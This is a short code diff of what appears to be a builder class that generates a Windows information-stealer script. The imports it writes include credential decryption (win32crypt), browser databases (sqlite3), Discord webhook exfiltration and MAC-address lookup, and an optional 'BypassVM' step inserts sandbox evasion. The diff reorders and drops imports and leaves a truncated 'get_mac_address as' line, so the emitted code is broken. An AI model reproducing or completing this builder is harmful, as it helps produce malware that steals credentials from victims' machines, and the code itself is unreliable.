@@ -28,15 +28,14 @@ class Encryptor:
 import os
 import json
 import base64
-import codecs
 import winreg
-import hashlib
 import shutil
 import psutil
 import random
 import zipfile
 import socket
 import sqlite3
+import codecs
 import platform
 import win32crypt
 import subprocess
@@ -54,8 +53,7 @@ from re import findall, match
 from urllib.request import urlopen
 from discord import File, Webhook, RequestsWebhookAdapter
 from discord_webhook import DiscordWebhook, DiscordEmbed
-from getmac import get_mac_address as gma
-from cryptography.fernet import Fernet""")
+from getmac import get_mac_address as """)
             if self.bypassVM == "y":
                 f.write("import BypassVM\n")
                 f.write("\nbypass = BypassVM.BypassVM()\n")
